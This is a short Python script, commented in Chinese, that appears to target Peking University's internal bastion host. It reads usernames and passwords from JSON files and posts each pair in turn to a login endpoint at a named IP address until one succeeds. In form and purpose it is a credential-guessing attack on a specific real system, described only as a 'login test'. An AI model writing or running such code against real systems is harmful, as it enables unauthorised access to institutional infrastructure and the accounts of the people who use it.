import json
import requests

# 北大内部堡垒机登录测试代码。

i=0
# 读取 users.json 文件
with open('users.json', 'r') as f:
    users = json.load(f)

# 固定的密码
with open('password.json', 'r') as f:
    password = json.load(f)


# 循环尝试每个用户名
for user in users:
    
    # 构造登录请求
    data = {
        'username': user,
        'password': password[i]
    }
    #response = requests.post('http://blj.pku.edu.cn/login', data=data)
    response = requests.post('http://169.105.67.9/login', data=data)
    i=i+1
    # 检查登录结果
    if response.status_code == 200 and 'Login succeeded' in response.text:
        print(f'Login succeeded with username "{user}" and password "{password}"')
        break
    else:
        print(f'Login failed with username "{user}"')
